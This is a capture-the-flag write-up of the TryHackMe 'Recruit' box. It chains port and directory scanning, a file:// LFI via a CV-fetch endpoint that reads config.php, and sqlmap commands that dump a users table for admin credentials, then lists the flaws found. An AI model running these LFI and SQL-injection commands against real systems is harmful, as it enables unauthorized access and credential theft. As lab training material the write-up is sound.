# Recruit (TryHackMe)

**Target:** `10.114.146.247`

Recruit is a hiring-portal box. Nothing exotic here — an exposed log file leaks a hint, a bad file-fetch feature turns into LFI, and the admin panel falls to a SQLi that sqlmap chews through in under a minute. Below is how I actually got through it.

## Port scan

Started with rustscan since it's faster than a full nmap sweep on a fresh box:

```
rustscan -b 500 -a 10.114.146.247 --top -- -sCV -Pn
```

![rustscan output](https://i.postimg.cc/vZJvD5nP/01-rustscan-1.png)
![rustscan output continued](https://i.postimg.cc/MpCYX1B9/02-rustscan-2.png)

Two ports came back:

| Port | Service | Version |
|------|---------|---------|
| 53/tcp | domain | ISC BIND 9.16.1 (Ubuntu) |
| 80/tcp | http | Apache httpd 2.4.41 (Ubuntu) |

DNS wasn't going anywhere useful, so port 80 was the whole game.

## Digging through the web root

Threw feroxbuster at it with the standard dirbuster medium list:

```
feroxbuster -u http://10.114.146.247 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![feroxbuster output](https://i.postimg.cc/rwB9z54Y/03-feroxbuster.png)

Three things stood out from the noise:

- `/mail/mail.log` — a mail log, just sitting there, readable
- `/api.php` — documentation for some internal API
- `/phpmyadmin/` — a DB admin panel (didn't end up needing it, but good to know it's there)

## The log file gives away the game

`/mail/mail.log` turned out to be an actual email thread between HR and IT, discussing the portal rollout.

![mail.log contents](https://i.postimg.cc/XYRgX95L/04-maillog.png)

One line in particular:

> HR login credentials (username: `hr`) are currently stored in the application configuration file (`config.php`) for ease of access during the initial rollout phase.

So now I had a username and knew exactly where the password lived. Just needed a way to read that file.

## api.php points at the bug

`/api.php` documented a CV-fetching feature:

> **How can I fetch a candidate CV using the API?**
> `/file.php?cv=<URL>`

A parameter that takes an arbitrary URL and fetches it is basically begging for SSRF or LFI. Tried the `file://` wrapper first.

## Reading config.php

```
curl "http://10.114.146.247/file.php?cv=file:///var/www/html/config.php"
```

![config.php source via LFI](https://i.postimg.cc/rwB9z54b/05-config-php.png)

That returned the raw PHP source, HR password included (redacted above). Paired with the username from the mail log, I had working credentials for the login page.

## Flag 1 — logging in as HR

Logged in, landed on `dashboard.php`, and there it was — a candidate table plus an HR flag sitting in a banner:

![HR dashboard with flag](https://i.postimg.cc/4xD1npcq/06-hr-dashboard-flag.png)

## The search box is the real way in

The dashboard has a candidate search field. Threw a stray `'` at it (`search=123'`) and got a SQL error back — classic sign the input isn't sanitized.

Grabbed the request in Burp, saved it to `request.txt`:

![Burp SQLi request](https://i.postimg.cc/t4Kz7F6L/07-burp-sqli.png)

Let sqlmap do the rest:

```
sqlmap -r request.txt -dbs
```

Confirmed both boolean-based blind and UNION-based injection (4 columns), MySQL on the back end. Database list:

```
information_schema, mysql, performance_schema, phpmyadmin, recruit_db, sys
```

`recruit_db` was obviously the target. Pulled its tables:

```
sqlmap -r request.txt -D recruit_db --tables
```

```
+------------+
| candidates |
| users      |
+------------+
```

And dumped `users`:

```
sqlmap -r request.txt -D recruit_db -T users --dump
```

![sqlmap dump of users table](https://i.postimg.cc/t4Kz7FPj/08-sqlmap-dump.png)

Admin credentials, straight out of the database (password redacted above).

## Flag 2 — admin login

Logged out of the HR session, back in as admin. Second flag came right up:

```
[REDACTED]
```

## How it all chains together

1. Recon finds HTTP on port 80
2. Directory brute-force finds `mail.log` and `api.php`
3. `mail.log` leaks the HR username and points to `config.php` for the password
4. `api.php` documents `file.php?cv=<URL>`, an unsanitized file-fetch endpoint
5. `file://` wrapper on `file.php` reads `config.php` directly → HR password
6. HR login → **Flag 1**
7. The dashboard search field is SQLi-vulnerable → sqlmap dumps `users` → admin credentials
8. Admin login → **Flag 2**

## Flags

| Flag | Value |
|------|-------|
| User | `[REDACTED]` |
| Admin | `[REDACTED]` |

## What's actually broken here

- A log file with credentials-adjacent info was left publicly reachable
- `file.php` trusts user-supplied URLs enough to let `file://` read arbitrary local files
- The HR password lived in plaintext in a config file that turned out to be readable anyway
- The candidate search field builds SQL without sanitizing input — full boolean-blind and UNION-based injection
- The admin password was weak enough that finding it in the DB dump was the easy part
